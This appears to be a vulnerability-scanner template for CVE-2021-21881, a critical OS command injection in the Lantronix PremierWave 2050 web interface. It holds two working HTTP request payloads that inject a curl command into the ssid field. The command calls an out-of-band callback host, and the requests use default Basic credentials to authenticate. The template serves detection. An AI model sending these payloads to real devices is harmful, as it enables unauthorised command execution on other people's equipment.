id: CVE-2021-21881
info:
  name: Lantronix PremierWave 2050 8.9.0.0R4 - Remote Command Injection
  author: gy741
  severity: critical
  description: Lantronix PremierWave 2050 8.9.0.0R4 is vulnerable to remote command
    injection due to an OS command injection vulnerability in the Web Manager Wireless
    Network Scanner that can be exploited by a specially-crafted authenticated HTTP
    request.
  reference:
  - https://talosintelligence.com/vulnerability_reports/TALOS-2021-1325
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21881
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2021-21881
    cwe-id: CWE-78
  tags: cve,cve2021,lantronix,rce,oast,cisco
  metadata:
    impact: The impact of CVE-2021-21881 on Lantronix PremierWave 2050 8.9.0.0R4 allows
      a remote attacker to execute arbitrary commands by exploiting a command injection
      vulnerability.
    recommendation: It is recommended that Lantronix PremierWave 2050 8.9.0.0R4 users
      update to the latest patched version to mitigate the risk of remote command
      injection vulnerabilities.
variables:
  useragent: '{{rand_base(6)}}'
requests:
- raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic dXNlcjp1c2Vy

    Content-Type: application/x-www-form-urlencoded


    ajax=WLANScanSSID&iehack=&Scan=Scan&netnumber=1&2=link&3=3&ssid="''; curl http://{{interactsh-url}}
    -H ''User-Agent: {{useragent}}'' #

    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic YWRtaW46UEFTUw==

    Content-Type: application/x-www-form-urlencoded


    ajax=WLANScanSSID&iehack=&Scan=Scan&netnumber=1&2=link&3=3&ssid="''; curl http://{{interactsh-url}}
    -H ''User-Agent: {{useragent}}'' #

    '
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{useragent}}'
